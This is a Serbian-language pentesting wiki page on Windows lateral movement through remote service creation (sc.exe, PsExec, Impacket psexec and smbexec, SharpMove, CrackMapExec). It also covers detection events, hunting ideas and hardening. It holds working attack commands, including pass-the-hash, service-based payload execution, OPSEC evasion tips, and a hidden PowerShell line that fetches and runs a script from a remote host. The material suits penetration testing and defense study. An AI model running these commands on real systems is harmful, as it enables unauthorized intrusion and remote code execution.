# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Kako funkcionišu

Ove tehnike zloupotrebljavaju Windows Service Control Manager (SCM) na daljinu preko SMB/RPC-a radi izvršavanja komandi na ciljnom hostu. Uobičajeni postupak je:

1. Autentifikujte se na ciljnom sistemu i pristupite deljenom resursu ADMIN$ preko SMB-a (TCP/445).
2. Kopirajte izvršnu datoteku ili navedite komandnu liniju za LOLBAS koju će usluga pokrenuti.
3. Daljinski kreirajte uslugu preko SCM-a (MS-SCMR preko \PIPE\svcctl) koja upućuje na tu komandu ili binarnu datoteku.
4. Pokrenite uslugu da biste izvršili payload i, po želji, uhvatili stdin/stdout preko imenovane cevi.
5. Zaustavite uslugu i očistite sistem (obrišite uslugu i sve postavljene binarne datoteke).

Zahtevi/preduslovi:
- Lokalni administrator na ciljnom sistemu (SeCreateServicePrivilege) ili izričita prava za kreiranje usluge na ciljnom sistemu.
- SMB (445) mora biti dostupan, a deljeni resurs ADMIN$ aktivan; host firewall mora da dozvoli Remote Service Management.
- UAC Remote Restrictions: kod lokalnih naloga, filtriranje tokena može blokirati administratorski pristup preko mreže, osim ako se koristi ugrađeni Administrator ili je LocalAccountTokenFilterPolicy=1.
- Kerberos naspram NTLM-a: korišćenje hostname-a/FQDN-a omogućava Kerberos; povezivanje pomoću IP adrese često prelazi na NTLM (što može biti blokirano u ojačanim okruženjima).

### Ručni ScExec/WinExec preko sc.exe

U nastavku je prikazan minimalni pristup kreiranju usluge. Putanja slike usluge može da upućuje na postavljenu EXE datoteku ili LOLBAS kao što su cmd.exe ili powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Napomene:
- Očekujte grešku zbog isteka vremena pri pokretanju EXE-a koji nije servis; izvršavanje se ipak odvija.
- Da biste bili što OPSEC-friendly, dajte prednost fileless komandama (cmd /c, powershell -enc) ili obrišite izbačene artefakte.

Detaljnije korake potražite na: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Alati i primeri

### Sysinternals PsExec.exe

- Klasičan administratorski alat koji koristi SMB za kopiranje PSEXESVC.exe u ADMIN$, instalira privremeni servis (podrazumevano ime PSEXESVC) i prosleđuje I/O putem imenovanih cevi.
- Primeri upotrebe:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Možete pokrenuti direktno sa Sysinternals Live-a putem WebDAV-a:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Ostavlja događaje instaliranja/deinstaliranja servisa (ime servisa je često PSEXESVC, osim ako se koristi -r) i tokom izvršavanja kreira C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (nalik PsExec-u)

- Koristi ugrađeni servis nalik RemCom-u. Preko ADMIN$ kopira privremeni binarni fajl servisa (obično sa nasumičnim imenom), kreira servis (podrazumevano je često RemComSvc) i prosleđuje I/O preko imenovane cevi.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefakti
- Privremeni EXE u direktorijumu C:\Windows\ (nasumičnih 8 znakova). Podrazumevani naziv servisa je RemComSvc, osim ako se ne navede drugačije.

### Impacket smbexec.py (SMBExec)

- Kreira privremeni servis koji pokreće cmd.exe i koristi imenovanu cev za I/O. Uglavnom izbegava smeštanje kompletnog EXE payload-a; izvršavanje komandi je poluinteraktivno.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral i SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementira nekoliko metoda za lateralno kretanje, uključujući izvršavanje zasnovano na servisima.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) omogućava izmenu/kreiranje servisa radi daljinskog izvršavanja komande.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- CrackMapExec možete koristiti i za izvršavanje preko različitih backend-ova (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, detekcija i artefakti

Tipični artefakti na hostu/mreži pri korišćenju tehnika sličnih PsExec-u:
- Security 4624 (Logon Type 3) i 4672 (Special Privileges) na ciljnom sistemu za korišćeni admin nalog.
- Security 5140/5145 File Share i File Share Detailed događaji koji prikazuju pristup ADMIN$ deljenom resursu i kreiranje/upis servisnih binarnih datoteka (npr. PSEXESVC.exe ili nasumični .exe naziv od 8 znakova).
- **System** 7045 iz Service Control Manager-a za instalaciju servisa na ciljnom sistemu: nazivi kao što su PSEXESVC, RemComSvc ili prilagođeni (`-r` / `-service-name`). Ovo potvrđuje da je servis instaliran, ali ne i da je njegova image datoteka pokrenuta. Uporedite vremensku oznaku i putanju image datoteke sa događajima procesa ili odgovarajućim service-image prefetch unosom, ako je dostupan.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) za services.exe ili image datoteku servisa, 3 (Network Connect), 11 (File Create) u C:\Windows\, 17/18 (Pipe Created/Connected) za pipe-ove kao što su \\.\pipe\psexesvc, \\.\pipe\remcom_* ili njihove nasumične varijante.
- Artefakt u registru za Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 na hostu operatera (ako nije potisnut).

Ideje za lov na pretnje
- Upozoravajte na instalacije servisa čiji ImagePath sadrži cmd.exe /c, powershell.exe ili lokacije TEMP.
- Potražite kreiranja procesa gde je ParentImage C:\Windows\PSEXESVC.exe ili procese-potomke servisa services.exe koji se izvršavaju kao LOCAL SYSTEM i pokreću shell-ove.
- Označite imenovane pipe-ove koji se završavaju sa -stdin/-stdout/-stderr ili koriste poznate nazive pipe-ova PsExec klonova.

## Rešavanje čestih problema
- Pristup je odbijen (5) pri kreiranju servisa: korisnik zapravo nije lokalni admin, aktivna su UAC ograničenja za udaljene lokalne naloge ili EDR zaštita od neovlašćenih izmena blokira putanju servisne binarne datoteke.
- Mrežna putanja nije pronađena (53) ili nije moguće povezivanje sa ADMIN$: firewall blokira SMB/RPC ili su admin deljeni resursi onemogućeni.
- Kerberos ne radi, ali je NTLM blokiran: povežite se koristeći hostname/FQDN (ne IP adresu), proverite da li su SPN-ovi ispravni ili pri korišćenju Impacket-a navedite -k/-no-pass uz tikete.
- Pokretanje servisa ističe, ali je payload pokrenut: očekivano ako to nije prava servisna binarna datoteka; zabeležite izlaz u datoteku ili koristite smbexec za I/O uživo.

## Napomene o hardening-u
- Windows 11 24H2 i Windows Server 2025 podrazumevano zahtevaju SMB signing za odlazne veze (i dolazne veze u Windows 11). To ne ometa legitimno korišćenje PsExec-a sa važećim kredencijalima, ali sprečava zloupotrebu SMB relay-a bez potpisa i može uticati na uređaje koji ne podržavaju signing.<sup>[[2]](#references)</sup>
- Novo blokiranje NTLM-a u SMB klijentu (Windows 11 24H2/Server 2025) može sprečiti NTLM fallback pri povezivanju preko IP adrese ili sa serverima koji ne koriste Kerberos. U harden-ovanim okruženjima to će onemogućiti PsExec/SMBExec zasnovan na NTLM-u; koristite Kerberos (hostname/FQDN) ili konfigurišite izuzetke ako su zaista potrebni.<sup>[[2]](#references)</sup>
- Princip najmanjih privilegija: smanjite članstvo u lokalnoj admin grupi, dajte prednost Just-in-Time/Just-Enough Admin pristupu, primenite LAPS i nadgledajte/aktivirajte upozorenja za instalacije servisa 7045.

## Pogledajte i

- Udaljeno izvršavanje zasnovano na WMI-ju (često bez datoteka):

{{#ref}}
./wmiexec.md
{{#endref}}

- Udaljeno izvršavanje zasnovano na WinRM-u:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Hardening SMB bezbednosti u Windows Server 2025 i Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Korišćenje kredencijala za preuzimanje kontrole nad Windows računarima – 2. deo (PSExec i servisi)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Rešavanje problema sa neočekivanim ponovnim pokretanjima pomoću sistemskih evidencija događaja](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
